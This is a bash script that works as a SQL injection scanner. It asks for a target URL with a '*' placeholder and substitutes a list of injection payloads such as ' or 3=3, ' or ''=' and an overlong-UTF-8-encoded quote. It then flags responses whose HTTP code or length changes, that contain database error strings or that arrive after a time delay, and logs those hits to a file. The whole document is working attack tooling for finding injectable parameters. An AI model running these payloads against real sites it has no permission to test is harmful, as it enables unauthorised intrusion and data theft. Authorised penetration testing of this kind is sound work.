#!/bin/bash

# Colors for terminal output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Signal handling for clean exit
trap 'echo -e "\n${RED}[!] Interrupted. Exiting...${NC}"; exit 1' SIGINT

# Base URL input with proper guidance
echo ""
echo -e "${YELLOW}[?]${NC} Enter base URL (replace parameter value with * )"
echo -e "${CYAN}    Example:${NC} http://target.com/page.php?id=*"
read -rp ">> " BASE_URL

if [[ "$BASE_URL" != *"*"* ]]; then
    echo -e "${RED}[X] Base URL must contain '*' as injection point.${NC}"
    exit 1
fi

# Timeouts and output
TIMEOUT=5
OUTPUT_FILE="sqli_results_$(date +%Y%m%d_%H%M%S).txt"

# Payloads (modify as needed)
PAYLOADS=(
    "%28"      # (
    "%29"      # )
    "%26"      # &
    "%21"      # !
    "' or ''='"
    "' or 3=3"
    " or 3=3 --"
    "%C0%80%27%C0%80%C0%80%C0%80O%C0%82R%C0%80%C0%801%C0%80%C0%A11"
    ")%20or%20('x'='x"
    "%20or%201=1"
)

# URL-encode function
urlencode() {
    local raw="$1"
    local encoded=""
    for ((i=0; i<${#raw}; i++)); do
        c=${raw:$i:1}
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) printf -v encoded '%s%%%02X' "$encoded" "'$c" ;;
        esac
    done
    echo "$encoded"
}

# Baseline request
BASELINE_URL="${BASE_URL//\*/}"
BASELINE_RESPONSE=$(curl -s --max-time "$TIMEOUT" "$BASELINE_URL")
BASELINE_CODE=$(curl -s -o /dev/null -w "%{http_code}" --max-time "$TIMEOUT" "$BASELINE_URL")
BASELINE_LENGTH=${#BASELINE_RESPONSE}

echo -e "${CYAN}[*] Baseline URL: $BASELINE_URL"
echo -e "[*] HTTP Code: $BASELINE_CODE, Length: $BASELINE_LENGTH${NC}"
echo ""

# Test function
test_payload() {
    local payload="$1"
    local index="$2"
    local total="$3"

    # URL encode payload
    local encoded_payload=$(urlencode "$payload")
    local test_url="${BASE_URL/\*/$encoded_payload}"

    # Start time
    local start_time=$(date +%s.%N)

    # Perform request
    local response=$(curl -s --max-time "$TIMEOUT" "$test_url" 2>/dev/null)
    local http_code=$(curl -s --max-time "$TIMEOUT" -o /dev/null -w "%{http_code}" "$test_url" 2>/dev/null)

    # Duration
    local end_time=$(date +%s.%N)
    local duration=$(echo "$end_time - $start_time" | bc -l 2>/dev/null || echo "0")

    local response_length=${#response}
    local length_diff=$((response_length - BASELINE_LENGTH))
    local status="NORMAL"
    local color="${NC}"

    # Anomaly detection
    if [[ "$http_code" != "$BASELINE_CODE" ]]; then
        status="HTTP_CHANGE"
        color="${YELLOW}"
    elif [[ $length_diff -gt 50 ]] || [[ $length_diff -lt -50 ]]; then
        status="LENGTH_CHANGE"
        color="${PURPLE}"
    elif echo "$response" | grep -Ei "error|warning|mysql|oracle|postgresql|syntax|sql" >/dev/null; then
        status="ERROR_DETECTED"
        color="${RED}"
    elif [[ $(echo "$duration > 3" | bc -l 2>/dev/null || echo 0) -eq 1 ]]; then
        status="TIME_DELAY"
        color="${GREEN}"
    fi

    # Progress display
    local progress=$((index * 100 / total))
    printf "\r${CYAN}[Progress: %3d%%]${NC} Testing payload: %s\n" "$progress" "$payload"
    echo -e "${BLUE}[*]${NC} Test URL: ${test_url}"

    # Output anomaly
    if [[ "$status" != "NORMAL" ]]; then
        printf "${color}[%s]${NC} Payload: %s\n" "$status" "$payload"
        echo -e "  └─ ${YELLOW}URL: ${test_url}${NC}"
        printf "  └─ HTTP Code: %s | Length: %d (%+d) | Time: %.2fs\n" "$http_code" "$response_length" "$length_diff" "$duration"

        {
            echo "[$status] Payload: $payload"
            echo "  Full URL: $test_url"
            echo "  HTTP Code: $http_code"
            echo "  Response Length: $response_length bytes (Δ$length_diff)"
            echo "  Response Time: ${duration}s"
            echo "  Response Snippet: ${response:0:200}..."
            echo ""
        } >> "$OUTPUT_FILE"
    fi
}

# Main execution
total_payloads=${#PAYLOADS[@]}
for i in "${!PAYLOADS[@]}"; do
    test_payload "${PAYLOADS[$i]}" "$((i+1))" "$total_payloads"
done

echo -e "\n${GREEN}[✓] Testing complete.${NC} Results saved to ${YELLOW}${OUTPUT_FILE}${NC}"
